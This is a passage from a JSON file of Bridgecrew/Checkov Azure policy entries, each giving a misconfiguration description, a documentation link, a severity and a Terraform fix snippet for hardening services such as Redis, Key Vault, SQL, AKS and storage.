        "description": "Azure Security Center Defender is set to Off for storage\nDescription\nAzure Defender is a cloud workload protection service that utilizes and agent-based deployment to analyze signals from Azure network fabric and the service control plane, to detect threats across all Azure resources. It can also analyze non-Azure resources, utilizing Azure Arc, including those on-premises and in both AWS and GCP (once they've been onboarded). \nAzure Defender for Storage detects unusual and potentially harmful attempts to access or exploit storage accounts.\nFix - Buildtime \nTerraform\n\nResource: azurerm_security_center_subscription_pricing\nArgument: resource_type - (Required) The resource type this setting affects. Ensure that StorageAccounts is declared to pass this check.\n\nGoresource \"azurerm_security_center_subscription_pricing\" \"example\" {\n  tier          = \"Standard\"\n  resource_type = \"AppServices,ContainerRegistry,KeyVaults,KubernetesService,SqlServers,SqlServerVirtualMachines,StorageAccounts,VirtualMachines,ARM,DNS\"\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_AZURE_88": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-app-services-use-azure-files",
        "description": "App services do not use Azure files\nDescription\nThe content directory of an app service should be located on an Azure file share. The storage account information for the file share must be provided before any publishing activity.\nFix - Buildtime \nTerraform\n\nResource: azurerm_app_service\nArgument: storage_account.type\n\nGoresource \"azurerm_app_service\" \"example\" {\n              ...\n +            storage_account {\n                name = \"test_name\"\n +              type = \"AzureFiles\"\n                ...\n                }\n              }\n",
        "severity": "LOW"
    },
    "CKV_AZURE_89": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-azure-cache-for-redis-disables-public-network-access",
        "description": "Azure cache for Redis has public network access enabled\nDescription\nBy ensuring that your Azure cache for Redis is not public, you can help protect your data from unauthorized access or tampering. Public cache for Redis are accessible over the internet, which can make them vulnerable to external threats such as hackers or malware. By making it private, you can help ensure that only authorized users can access the data.\nFix - Buildtime \nTerraform\n\nResource: azurerm_redis_cache\nArgument: public_network_access_enabled\n\nGoresource \"azurerm_redis_cache\" \"example\" {\n                      ...\n+                     public_network_access_enabled  = false\n                                            ...\n                }\n                    }\n",
        "severity": "LOW"
    },
    "CKV_AZURE_91": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-only-ssl-are-enabled-for-cache-for-redis",
        "description": "Not only SSL are enabled for cache for Redis\nDescription\nSSL helps protect your data from unauthorized access or tampering by encrypting the data as it is transmitted between the Redis instance and the client. By enabling SSL, you can help ensure that only authorized users with the correct keys can access and decrypt the data, and that the data is protected while in transit.\nFix - Buildtime \nTerraform\n\nResource: azurerm_redis_cache\nArgument: enable_non_ssl_port\n\nGoresource \"azurerm_redis_cache\" \"example\" {\n                      ...\n +                    enable_non_ssl_port = false\n                      ...\n                    }\n",
        "severity": "LOW"
    },
    "CKV_AZURE_93": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-managed-disks-use-a-specific-set-of-disk-encryption-sets-for-the-customer-managed-key-encryption",
        "description": "Managed disks do not use a specific set of disk encryption sets for customer-managed key encryption\nDescription\nRequiring a specific set of disk encryption sets to be used with managed disks give you control over the keys used for encryption at rest. You are able to select the allowed encrypted sets and all others are rejected when attached to a disk.\nFix - Buildtime \nTerraform\n\nResource: azurerm_managed_disk\nArgument:  disk_encryption_set_id\n\nGoresource \"azurerm_managed_disk\" \"source\" {\n              name                 = \"acctestmd1\"\n              location             = \"West US 2\"\n              resource_group_name  = azurerm_resource_group.example.name\n              storage_account_type = \"Standard_LRS\"\n              create_option        = \"Empty\"\n              disk_size_gb         = \"1\"\n+             disk_encryption_set_id = \"koko\"\n              tags = {\n                environment = \"staging\"\n              }\n            }\n",
        "severity": "LOW"
    },
    "CKV_AZURE_94": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-my-sql-server-enables-geo-redundant-backups",
        "description": "My SQL server disables geo-redundant backups\nDescription\nEnsure that your Microsoft Azure My SQL database servers have geo-redundant backups enabled, to allow you to restore your My SQL servers to a different Azure region in the event of a regional outage or a disaster.\nGeo-restore is the default recovery option when your My SQL database server is unavailable because of a large-scale incident, such as a natural disaster, occurs in the region where the database server is hosted. .During geo-restore, the My SQL server configuration can be changed. These configuration changes include compute generation, vCore, backup retention period and backup redundancy options.\nFix - Runtime\nIn Azure console\n\nSign in to Azure Management Console.\nNavigate to All resources blade at https://portal.azure.com/#blade/HubsExtension/BrowseAll to access all your Microsoft Azure resources.\nFrom the Type filter box, select Azure Database for My SQL server to list the My SQL servers provisioned within your Azure account.\nClick on the name of the My SQL database server that you want to examine.\nIn the navigation panel, under Settings, select Pricing tier to access the pricing tier settings available for the selected My SQL server.\nOn the Pricing tier page, in the Backup Redundancy Options section, check the backup redundancy tier configured for the database server. If the selected tier is Locally Redundant, the data can be recovered from within the current region only, therefore the Geo-Redundant backup feature is not enabled for the selected Microsoft Azure My SQL database server.\nRepeat steps no. 4 \u2013 6 for each My SQL database server available in the current Azure subscription.\nRepeat steps no. 3 \u2013 7 for each subscription created in your Microsoft Azure cloud account.\n\nFix - Buildtime \nTerraform\n\nResource: azurerm_mysql_server\nArgument: geo_redundant_backup_enabled\n\nGoresource \"azurerm_mysql_server\" \"example\" {\n  ...\n+ geo_redundant_backup_enabled = true\n}\n",
        "severity": "LOW"
    },
    "CKV_AZURE_97": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-virtual-machine-scale-sets-have-encryption-at-host-enabled",
        "description": "Virtual Machine scale sets do not have encryption at host enabled\nDescription\nUse encryption at host to get end-to-end encryption for your virtual machine and virtual machine scale set data. Encryption at host enables encryption at rest for your temporary disk and OS/data disk caches. Temporary and ephemeral OS disks are encrypted with platform-managed keys when encryption at host is enabled. OS/data disk caches are encrypted at rest with either customer-managed or platform-managed key, depending on the encryption type selected on the disk. \nFix - Buildtime \nTerraform\n\nResource: azurerm_windows_virtual_machine_scale_set\nArgument: encryption_at_host_enabled\n\nGoresource \"azurerm_windows_virtual_machine_scale_set\" \"example\" {\n                  ...\n  +               encryption_at_host_enabled = true\n                  ...\n                  }\n",
        "severity": "LOW"
    },
    "CKV_AZURE_101": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-azure-cosmos-db-disables-public-network-access",
        "description": "Azure Cosmos DB enables public network access\nDescription\nBy ensuring that your Azure Cosmos DB  is not public, you can help protect your data from unauthorized access or tampering. Public Azure Cosmos DBs are accessible over the internet, which can make them vulnerable to external threats such as hackers or malware. By making it private, you can help ensure that only authorized users can access the data.\nFix - Buildtime \nTerraform\n\nResource: azurerm_cosmosdb_account\nArgument: public_network_access_enabled\n\nGoresource \"azurerm_cosmosdb_account\" \"db\" {\n        ...\n +    public_network_access_enabled = false\n\n}\n",
        "severity": "LOW"
    },
    "CKV_AZURE_102": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-postgresql-server-enables-geo-redundant-backups",
        "description": "PostgreSQL server disables geo-redundant backups\nDescription\nAzure PostgreSQL allows you to choose between locally redundant or geo-redundant backup storage in the General Purpose and Memory Optimized tiers. When the backups are stored in geo-redundant backup storage, they are not only stored within the region in which your server is hosted, but are also replicated to a paired data center. This provides better protection and ability to restore your server in a different region in the event of a disaster. \nFix - Buildtime \nTerraform\n\nResource: azurerm_postgresql_server\nArgument: geo_redundant_backup_enabled - (Optional) Turn Geo-redundant server backups on/off. \n\nGoresource \"azurerm_postgresql_server\" \"example\" {\n  ...\n+ geo_redundant_backup_enabled = true\n}\n",
        "severity": "LOW"
    },
    "CKV_AZURE_105": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-data-lake-store-accounts-enables-encryption",
        "description": "Unencrypted Data Lake Store accounts \nDescription\n\u200eAzure Data Lake Storage Gen2 is a set of capabilities dedicated to big data analytics, built on Azure Blob storage. Data Lake Storage Gen2 converges the capabilities of Azure Data Lake Storage Gen1 with Azure Blob storage. Data Lake Storage Gen1 supports encryption of data both at rest and in transit. For data at rest, Data Lake Storage Gen1 supports \"on by default,\" transparent encryption. \nFix - Buildtime \nTerraform\n\nResource: xyz\nArgument: encryption_state - (Optional) Is Encryption enabled on this Data Lake Store Account? Possible values are Enabled or Disabled. Defaults to Enabled.\n\nencryption_type - (Optional) The Encryption Type used for this Data Lake Store Account. Currently can be set to ServiceManaged when encryption_state is Enabled - and must be a blank string when it's Disabled.\nGoresource \"azurerm_data_lake_store\" \"example\" {\n  ...\n  encryption_state    = \"Enabled\"\n  encryption_type     = \"ServiceManaged\"\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_AZURE_106": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-azure-event-grid-domain-public-network-access-is-disabled",
        "description": "Azure Event Grid domain public network access is enabled\nDescription\nBy ensuring that your Azure Event Grid domain is not public, you can help protect your data from unauthorized access or tampering. Public Azure Event Grid domains are accessible over the internet, which can make them vulnerable to external threats such as hackers or malware. By making it private, you can help ensure that only authorized users can access the data.\nFix - Buildtime \nTerraform\n\nResource: azurerm_eventgrid_domain\nArgument: public_network_access_enabled\n\nGoresource \"azurerm_eventgrid_domain\" \"example\" {\n              ...\n+             public_network_access_enabled = false\n              }\n",
        "severity": "MEDIUM"
    },
    "CKV_AZURE_107": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-api-management-services-uses-virtual-networks",
        "description": "API management services do not use virtual networks\nDescription\nA virtual network is a logical network in Azure that is isolated from other networks. When you configure your API management service to use a virtual network, you can control the inbound and outbound network traffic to and from your service using network security groups (NSGs) and service endpoints. This can help to improve the security of your service and protect it from unauthorized access or attacks.\nFix - Buildtime \nTerraform\n\nResource: azurerm_api_management\nArgument:  virtual_network_configuration\n\nGoresource \"azurerm_api_management\" \"example\" {\n                  ...\n +                virtual_network_configuration {\n                    subnet_id = azure_subnet.subnet_not_public_ip.id \n                  }\n                  ....\n                }\n",
        "severity": "LOW"
    },
    "CKV_AZURE_108": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-azure-iot-hub-disables-public-network-access",
        "description": "Azure IoT Hub enables public network access\nDescription\nBy ensuring that your IoT Hub  is not public, you can help protect your data from unauthorized access or tampering. Public IoT Hubs are accessible over the internet, which can make them vulnerable to external threats such as hackers or malware. By making it private, you can help ensure that only authorized users can access the data.\nFix - Buildtime \nTerraform\n\nResource: azurerm_iothub\nArgument: public_network_access_enabled\n\nGoresource \"azurerm_iothub\" \"example\" {\n                ...\n+             public_network_access_enabled = false\n              route {\n                name           = \"export\"\n                source         = \"DeviceMessages\"\n                condition      = \"true\"\n                endpoint_names = [\"export\"]\n                enabled        = true\n              }\n                        ...\n            }\n",
        "severity": "MEDIUM"
    },
    "CKV_AZURE_109": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-key-vault-allows-firewall-rules-settings",
        "description": "Key vault does not allow firewall rules settings\nDescription\nKey vault's firewall prevents unauthorized traffic from reaching your key vault and provides an additional layer of protection for your secrets. Enable the firewall to make sure that only traffic from allowed networks can access your key vault. By defining \"bypass=AzureServices\" and \"default_action= \"deny\" - only matched ip_rules and/or virtual_network_subnet_ids will be passed\nFix - Buildtime \nTerraform\n\nResource: azurerm_key_vault\nArgument: network_acls.default_action\n\nGoresource \"azurerm_key_vault\" \"example\" {\n                  ...\n +                network_acls {\n +                  default_action = \"Deny\"\n +                  bypass = \"AzureServices\" \n                  }\n                }\n",
        "severity": "MEDIUM"
    },
    "CKV_AZURE_111": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-key-vault-enables-soft-delete",
        "description": "Key vault does not enable soft-delete\nDescription\nDeleting a key vault without soft delete enabled permanently deletes all secrets, keys, and certificates stored in the key vault. Accidental deletion of a key vault can lead to permanent data loss. Soft delete allows you to recover an accidentally deleted key vault for a configurable retention period.\nFix - Buildtime \nTerraform\n\nResource: azurerm_key_vault\nArgument: soft_delete_retention_days - (Optional) The number of days that items should be retained for once soft-deleted. This value can be between 7 and 90 (the default) days.\n\nGoresource \"azurerm_key_vault\" \"example\" {\n  ...\n+   soft_delete_retention_days  = 7\n}\n",
        "severity": "LOW"
    },
    "CKV_AZURE_112": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-key-vault-key-is-backed-by-hsm",
        "description": "Key vault key is not backed by HSM\nDescription\nFor added assurance, when you use Azure Key Vault, you can import or generate keys in hardware security modules (HSMs) that never leave the HSM boundary. This scenario is often referred to as bring your own key, or BYOK. Azure Key Vault uses nCipher nShield family of HSMs (FIPS 140-2 Level 2 validated) to protect your keys.\nYou should be aware of the cost implications of using an HSM and whether this fits in with your security posture.\nFix - Buildtime \nTerraform\n\nResource: azurerm_key_vault_key\nArgument: key_type - (Required) Specifies the Key Type to use for this Key Vault Key. Possible values are EC (Elliptic Curve), EC-HSM, Oct (Octet), RSA and RSA-HSM. Changing this forces a new resource to be created.\n\nazurerm_key_vault_key.generated.tfresource \"azurerm_key_vault_key\" \"generated\" {\n  ...\n+  key_type     = \"RSA-HSM\"\n  ...\n}\n\nSelect an option with \"-HSM\" to pass this check.",
        "severity": "LOW"
    },
    "CKV_AZURE_113": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-sql-server-disables-public-network-access",
        "description": "SQL Server is enabled for public network access\nDescription\nBy ensuring that your SQL server is not public, you can help protect your data from unauthorized access or tampering. Public SQL servers are accessible over the internet, which can make them vulnerable to external threats such as hackers or malware. By making it private, you can help ensure that only authorized users can access the data.\nFix - Buildtime \nTerraform\n\nResource: azurerm_mssql_server\nArgument: public_network_access_enabled\n\nGoresource \"azurerm_mssql_server\" \"example\" {\n              ...\n +            public_network_access_enabled = false\n            }\n",
        "severity": "LOW"
    },
    "CKV_AZURE_114": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-key-vault-secrets-have-content_type-set",
        "description": "Key vault secrets do not have content_type set\nDescription\nAzure Key Vault is a service for Secrets management to securely store and control access to tokens, passwords, certificates, API keys, and other secrets.\nA content type tag helps identify whether a secret is a password, connection string, etc. Different secrets have different rotation requirements. Content type tag should be set on secrets.\nFix - Buildtime \nTerraform\n\nResource: azurerm_key_vault\nArgument: content_type - (Optional) Specifies the content type for the Key Vault Secret.\n\nGoresource \"azurerm_key_vault\" \"example\" {\n  name                       = \"examplekeyvault\"\n  location                   = azurerm_resource_group.example.location\n  resource_group_name        = azurerm_resource_group.example.name\n  tenant_id                  = data.azurerm_client_config.current.tenant_id\n  sku_name                   = \"premium\"\n  soft_delete_retention_days = 7\n  + content_type = \"text/plain\"\n}\n",
        "severity": "LOW"
    },
    "CKV_AZURE_116": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-aks-uses-azure-policies-add-on",
        "description": "AKS does not use Azure policies add-on\nDescription\nAzure Policy Add-on for Kubernetes service (AKS) extends Gatekeeper v3, an admission controller webhook for Open Policy Agent (OPA), to apply at-scale enforcements and safeguards on your clusters in a centralized, consistent manner.\nFix - Buildtime \nTerraform\n\nResource: azurerm_kubernetes_cluster\nArgument: addon_profile.azure_policy.enabled\n\nGoresource \"azurerm_kubernetes_cluster\" \"example\" {\n                  ...\n+                  addon_profile {\n+                    azure_policy {\n+                      enabled = true\n                    }\n                  }         \n                }\n",
        "severity": "LOW"
    },
    "CKV_AZURE_117": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-aks-uses-disk-encryption-set",
        "description": "AKS does not use disk encryption set\nDescription\nDisk encryption is a security measure that encrypts the data on a disk to protect it from unauthorized access or tampering. When disk encryption is enabled for AKS, it encrypts the data on the disks that are used by the nodes in your cluster. This can help to protect your data from being accessed or modified by unauthorized users, even if the disks are physically stolen or the data is accessed from an unauthorized location.\nFix - Buildtime \nTerraform\n\nResource: azurerm_kubernetes_cluster\nArgument: disk_encryption_set_id\n\nGoresource \"azurerm_kubernetes_cluster\" \"example\" {\n              ...\n +            disk_encryption_set_id = \"someId\"\n            }\n",
        "severity": "LOW"
    },
    "CKV2_AZURE_11": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-azure-data-explorer-encryption-at-rest-uses-a-customer-managed-key",
        "description": "Azure Data Explorer encryption at rest does not use a customer-managed key\nDescription\nEnabling encryption at rest using a customer-managed key on your Azure Data Explorer cluster provides additional control over the key being used by the encryption at rest. This feature is oftentimes applicable to customers with special compliance requirements and requires a Key Vault to managing the keys.\nFix - Buildtime \nTerraform\n\nResource: azurerm_kusto_cluster, azurerm_kusto_cluster_customer_managed_key\nArgument: cluster_id  (of azurerm_kusto_cluster_customer_managed_key )\n\nGoresource \"azurerm_kusto_cluster\" \"cluster_ok\" {\n  name                = \"kustocluster\"\n  location            = azurerm_resource_group.rg.location\n  resource_group_name = azurerm_resource_group.rg.name\n\n  sku {\n    name     = \"Standard_D13_v2\"\n    capacity = 2\n  }\n\n  identity {\n    type = \"SystemAssigned\"\n  }\n}\n\nresource \"azurerm_kusto_cluster_customer_managed_key\" \"example\" {\n  cluster_id   = azurerm_kusto_cluster.cluster_ok.id\n  key_vault_id = azurerm_key_vault.example.id\n  key_name     = azurerm_key_vault_key.example.name\n  key_version  = azurerm_key_vault_key.example.version\n}\n",
        "severity": "LOW"
    },
    "CKV_AZURE_122": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-application-gateway-uses-waf-in-detection-or-prevention-modes",
        "description": "Application gateway does not use WAF in Detection or Prevention modes\nDescription\nWAF has two modes: Detection and Prevention. In Detection mode, WAF analyzes incoming traffic to the application gateway and logs any requests that are determined to be malicious based on a set of rules. This can help you to identify potential security threats and take appropriate action to protect your application.\nIn Prevention mode, WAF analyzes incoming traffic to the application gateway and blocks any requests that are determined to be malicious based on a set of rules. This can help to prevent malicious requests from reaching your application and potentially causing damage.\nFix - Buildtime \nTerraform\n\nResource: azurerm_web_application_firewall_policy\nArgument: policy_settings.enabled +  policy_settings.mode\n\nGoresource \"azurerm_web_application_firewall_policy\" \"example\" {\n                                            ...\n                      policy_settings {\n+                       mode                        = \"Prevention\"\n                        request_body_check          = true\n                        file_upload_limit_in_mb     = 100\n                        max_request_body_size_in_kb = 128\n                    }\n",
        "severity": "LOW"
    },
    "CKV_AZURE_123": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-azure-front-door-uses-waf-in-detection-or-prevention-modes",
        "description": "Azure front door does not use WAF in Detection or Prevention modes\nDescription\nWAF has two modes: Detection and Prevention. In Detection mode, WAF analyzes incoming traffic to the Azure front door and logs any requests that are determined to be malicious based on a set of rules. This can help you to identify potential security threats and take appropriate action to protect your application.\nIn Prevention mode, WAF analyzes incoming traffic to the application gateway and blocks any requests that are determined to be malicious based on a set of rules. This can help to prevent malicious requests from reaching your application and potentially causing damage.\nFix - Buildtime \nTerraform\n\nResource: azurerm_frontdoor_firewall_policy\nArgument: policy_settings.enabled + policy_settings.mode\n\nGoresource \"azurerm_frontdoor_firewall_policy\" \"example\" {\n\n                                            ...\n                      policy_settings {\n +                      enabled                     = true\n +                      mode                        = \"Prevention\"\n                        request_body_check          = true\n                        file_upload_limit_in_mb     = 100\n                        max_request_body_size_in_kb = 128\n                      }\n                      ...\n                    }\n",
        "severity": "LOW"
    },
    "CKV_AZURE_124": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-azure-cognitive-search-disables-public-network-access",
        "description": "Azure Cognitive Search does not disable public network access\nDescription\nIt is moreIt is generally a good security practice to ensure that your Azure Cognitive Search instance does not have public network access enabled, as this means that it is only accessible from within your private network. This can help to protect your search instance from unauthorized access, as external parties will not be able to connect to it over the internet. It is especially important to ensure that public network access is disabled if your Azure Cognitive Search instance contains sensitive or confidential data. \nFix - Buildtime \nTerraform\n\nResource: azurerm_search_service\nArgument: public_network_access_enabled\n\nGoresource \"azurerm_search_service\" \"example\" {\n              ...\n +            public_network_access_enabled = false\n}\n",
        "severity": "LOW"
    },
    "CKV_AZURE_130": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-postgresql-server-enables-infrastructure-encryption",
        "description": "PostgreSQL server does not enable infrastructure encryption\nDescription\nEnable infrastructure encryption for Azure Database for PostgreSQL servers to have higher level of assurance that the data is secure. When infrastructure encryption is enabled, the data at rest is encrypted twice using FIPS 140-2 compliant Microsoft managed keys.\nFix - Buildtime \nTerraform\n\nResource: azurerm_postgresql_server\nArgument: infrastructure_encryption_enabled\n\nGoresource \"azurerm_postgresql_server\" \"example\" {\n              ...\n+             infrastructure_encryption_enabled = true\n            }\n",
        "severity": "LOW"
    },
    "CKV_AZURE_131": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-security-contact-emails-is-set",
        "description": "Security contact emails are not set\nDescription\nAzure Security Center recommends adding one valid security contact email address for each Microsoft Azure subscription. Security Center emails designated administrators using the defined security contact in case the Microsoft security team find Azure cloud resources are compromised.\nFix - Buildtime \nTerraform\n\nResource: azurerm_security_center_contact\nArgument: email - (Required) The email of the Security Center Contact.\n\nGoresource \"azurerm_security_center_contact\" \"example\" {\n+  email = \"[email\u00a0protected]\"\n        ...\n}\n",
        "severity": "MEDIUM"
    },
    "CKV2_AZURE_7": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-azure-active-directory-admin-is-configured",
        "description": "SQL servers do not have Azure Active Directory admin configured\nDescription\nUse Azure Active Directory Authentication for authentication with SQL Database.\nAzure Active Directory authentication is a mechanism to connect to Microsoft Azure SQL Database and SQL Data Warehouse by using identities in Azure Active Directory (Azure AD). With Azure AD authentication, identities of database users and other Microsoft services can be managed in one central location. Central ID management provides a single place to manage database users and simplifies permission management.\n\nIt provides an alternative to SQL Server authentication.\nHelps stop the proliferation of user identities across database servers.\nAllows password rotation in a single place.\nCustomers can manage database permissions using external (AAD) groups.\nIt can eliminate storing passwords by enabling integrated Windows authentication and other forms of authentication supported by Azure Active Directory.\nAzure AD authentication uses contained database users to authenticate identities at the database level.\nAzure AD supports token-based authentication for applications connecting to SQL Database.\nAzure AD authentication supports ADFS (domain federation) or native user/password authentication for a local Azure Active Directory without domain synchronization.\nAzure AD supports connections from SQL Server Management Studio that use Active Directory Universal Authentication, which includes Multi-Factor Authentication (MFA). MFA includes strong authentication with a range of easy verification options \u2014 phone call, text message, smart cards with pin, or mobile app notification.\n\nFix - Buildtime \nTerraform\n\nResource: azurerm_resource_group, azurerm_sql_server, azurerm_sql_active_directory_administrator\nArgument: server_name (of azurerm_sql_active_directory_administrator)\n\nGodata \"azurerm_client_config\" \"current\" {}\n\nresource \"azurerm_resource_group\" \"example\" {\n  name     = \"example-resources\"\n  location = \"West Europe\"\n}\n\nresource \"azurerm_sql_server\" \"sql_server_good\" {\n  name                         = \"mysqlserver\"\n  resource_group_name          = azurerm_resource_group.example.name\n  location                     = azurerm_resource_group.example.location\n  version                      = \"12.0\"\n  administrator_login          = \"4dm1n157r470r\"\n  administrator_login_password = \"4-v3ry-53cr37-p455w0rd\"\n}\n\n\nresource \"azurerm_sql_active_directory_administrator\" \"example\" {\n+ server_name         = azurerm_sql_server.sql_server_good.name\n  resource_group_name = azurerm_resource_group.example.name\n  login               = \"sqladmin\"\n  tenant_id           = data.azurerm_client_config.current.tenant_id\n  object_id           = data.azurerm_client_config.current.object_id\n}\n",
        "severity": "LOW"
    },
    "CKV2_AZURE_17": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-postgresql-server-enables-customer-managed-key-for-encryption",
        "description": "PostgreSQL server does not enable customer-managed key for encryption\nDescription\nUse customer-managed keys to manage the encryption at rest of your PostgreSQL servers. By default, the data is encrypted at rest with service-managed keys, but customer-managed keys are commonly required to meet regulatory compliance standards. Customer-managed keys enable the data to be encrypted with an Azure Key Vault key created and owned by you. You have full control and responsibility for the key lifecycle, including rotation and management.\nFix - Buildtime \nTerraform\n\nResource: azurerm_resource_group, azurerm_key_vault,  azurerm_key_vault_access_policy,  azurerm_key_vault_key, azurerm_postgresql_server, azurerm_postgresql_server_key\n\nGoresource \"azurerm_resource_group\" \"ok\" {\n  name     = \"ok-resources\"\n  location = \"West Europe\"\n}\n\nresource \"azurerm_key_vault\" \"ok\" {\n  name                     = \"okkv\"\n  location                 = azurerm_resource_group.ok.location\n  resource_group_name      = azurerm_resource_group.ok.name\n  tenant_id                = data.azurerm_client_config.current.tenant_id\n  sku_name                 = \"premium\"\n  purge_protection_enabled = true\n}\n\nresource \"azurerm_key_vault_access_policy\" \"server\" {\n  key_vault_id       = azurerm_key_vault.ok.id\n  tenant_id          = data.azurerm_client_config.current.tenant_id\n  object_id          = azurerm_postgresql_server.ok.identity.0.principal_id\n  key_permissions    = [\"get\", \"unwrapkey\", \"wrapkey\"]\n  secret_permissions = [\"get\"]\n}\n\nresource \"azurerm_key_vault_access_policy\" \"client\" {\n  key_vault_id       = azurerm_key_vault.ok.id\n  tenant_id          = data.azurerm_client_config.current.tenant_id\n  object_id          = data.azurerm_client_config.current.object_id\n  key_permissions    = [\"get\", \"create\", \"delete\", \"list\", \"restore\", \"recover\", \"unwrapkey\", \"wrapkey\", \"purge\", \"encrypt\", \"decrypt\", \"sign\", \"verify\"]\n  secret_permissions = [\"get\"]\n}\n\nresource \"azurerm_key_vault_key\" \"ok\" {\n  name         = \"tfex-key\"\n  key_vault_id = azurerm_key_vault.ok.id\n  key_type     = \"RSA\"\n  key_size     = 2048\n  key_opts     = [\"decrypt\", \"encrypt\", \"sign\", \"unwrapKey\", \"verify\", \"wrapKey\"]\n  depends_on = [\n    azurerm_key_vault_access_policy.client,\n    azurerm_key_vault_access_policy.server,\n  ]\n}\n\nresource \"azurerm_postgresql_server\" \"ok\" {\n  name                             = \"ok-pg-server\"\n  location                         = azurerm_resource_group.ok.location\n  resource_group_name              = azurerm_resource_group.ok.name\n  sku_name                         = \"GP_Gen5_2\"\n  administrator_login              = \"acctestun\"\n  administrator_login_password     = \"[email\u00a0protected]!\"\n  ssl_enforcement_enabled          = true\n  ssl_minimal_tls_version_enforced = \"TLS1_1\"\n  storage_mb                       = 51200\n  version                          = \"5.6\"\n\n  identity {\n    type = \"SystemAssigned\"\n  }\n}\n\nresource \"azurerm_postgresql_server_key\" \"ok\" {\n  server_id        = azurerm_postgresql_server.ok.id\n  key_vault_key_id = azurerm_key_vault_key.ok.id\n}\n",
        "severity": "LOW"
    },
    "CKV2_AZURE_21": {
        "url": "https://docs.bridgecrew.io/docs/ensure-storage-logging-is-enabled-for-blob-service-for-read-requests",
        "description": "Azure storage account logging for blobs is disabled\nDescription\nThe Storage Blob service provides scalable, cost-efficient objective storage in the cloud. Storage Logging happens server-side and allows details for both successful and failed requests to be recorded in the storage account. These logs allow users to see the details of read, write, and delete operations against the blobs. Storage Logging log entries contain the following information about individual requests: Timing information such as start time, end-to-end latency, and server latency, authentication details , concurrency information and the sizes of the request and response messages.\nStorage Analytics logs contain detailed information about successful and failed requests to a storage service. This information can be used to monitor individual requests and to diagnose issues with a storage service. Requests are logged on a best-effort basis.\nWe recommend that you ensure Storage Logging is enabled for Blob Service for Read Requests\nFix - Buildtime \nTerraform\n\nResource: azurerm_resource_group, azurerm_log_analytics_workspace, azurerm_storage_account, azurerm_log_analytics_storage_insights,azurerm_storage_container\n\nGoresource \"azurerm_resource_group\" \"resource_group_ok\" {\n  name     = \"example-resources\"\n  location = \"West Europe\"\n}\n\nresource \"azurerm_log_analytics_workspace\" \"analytics_workspace_ok\" {\n  name                = \"exampleworkspace\"\n  location            = azurerm_resource_group.resource_group_ok.location\n  resource_group_name = azurerm_resource_group.resource_group_ok.name\n  sku                 = \"PerGB2018\"\n  retention_in_days   = 30\n}\n\nresource \"azurerm_storage_account\" \"storage_account_ok\" {\n  name                     = \"examplestoracc\"\n  resource_group_name      = azurerm_resource_group.resource_group_ok.name\n  location                 = azurerm_resource_group.resource_group_ok.location\n  account_tier             = \"Standard\"\n  account_replication_type = \"LRS\"\n}\n\nresource \"azurerm_log_analytics_storage_insights\" \"analytics_storage_insights_ok\" {\n  name                = \"example-storageinsightconfig\"\n  resource_group_name = azurerm_resource_group.resource_group_ok.name\n  workspace_id        = azurerm_log_analytics_workspace.analytics_workspace_ok.id\n\n  storage_account_id  = azurerm_storage_account.storage_account_ok.id\n  storage_account_key = azurerm_storage_account.storage_account_ok.primary_access_key\n  blob_container_names= [\"blobExample_ok\"]\n}\n\nresource \"azurerm_storage_container\" \"storage_container_ok\" {\n  name                   = \"my-awesome-content.zip\"\n  storage_account_name   = azurerm_storage_account.storage_account_ok.name\n  storage_container_name = azurerm_storage_container.storage_container_ok.name\n  container_access_type  = \"blob\"\n}\n",
        "severity": "LOW"
    },
    "CKV2_AZURE_14": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-unattached-disks-are-encrypted",
        "description": "Unattached disks are not encrypted\nDescription\nEncrypting your disks protect your data from unauthorized access or tampering. That way, you can ensure that only authorized users can access and modify the contents of your disks. Such action can help protect against external threats such as hackers or malware, as well as internal threats such as accidental or unauthorized access.\nFix - Buildtime \nTerraform\n\nResource: azurerm_resource_group, azurerm_managed_disk, azurerm_virtual_machine\nArgument: encryption_settings.encrypted\n\nGoresource \"azurerm_resource_group\" \"group\" {\n  name     = \"example-resources\"\n  location = \"West Europe\"\n}\n\nresource \"azurerm_managed_disk\" \"managed_disk_good_1\" {\n  name                 = \"acctestmd\"\n  location             = \"West US 2\"\n  resource_group_name  = azurerm_resource_group.group.name\n  storage_account_type = \"Standard_LRS\"\n  create_option        = \"Empty\"\n  disk_size_gb         = \"1\"\n\n+ encryption_settings {\n+   enabled = true\n  }\n  tags = {\n    environment = \"staging\"\n  }\n}\n\n\n\nresource \"azurerm_virtual_machine\" \"virtual_machine_good_1\" {\n  name                  = \"$vm\"\n  location              = \"location\"\n  resource_group_name  = azurerm_resource_group.group.name\n  network_interface_ids = [\"id\"]\n  vm_size               = \"Standard_DS1_v2\"\n  storage_image_reference {\n    publisher = \"Canonical\"\n    offer     = \"UbuntuServer\"\n    sku       = \"16.04-LTS\"\n    version   = \"latest\"\n  }\n  storage_os_disk {\n    name              = \"myosdisk1\"\n    caching           = \"ReadWrite\"\n    create_option     = \"FromImage\"\n    managed_disk_id = azurerm_managed_disk.managed_disk_good_1.id\n  }\n}\n",
        "severity": "LOW"
    },
